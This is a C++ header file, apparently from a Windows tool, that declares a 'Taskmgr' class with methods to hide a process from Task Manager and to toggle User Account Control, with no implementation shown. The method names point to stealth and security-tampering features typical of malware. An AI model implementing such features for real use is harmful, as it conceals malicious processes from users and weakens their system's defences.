#ifndef TASKMGR_HPP
#define TASKMGR_HPP

#include <ClassManager/BaseClass.hpp>
#include <Windows.h>
#include <string>

class Taskmgr : public BaseClass {
private:

	bool hideProcFromTaskMgr();

public:

	void tick(void* state) override;

	bool setUAC(bool state);

};

#endif TASKMGR_HPP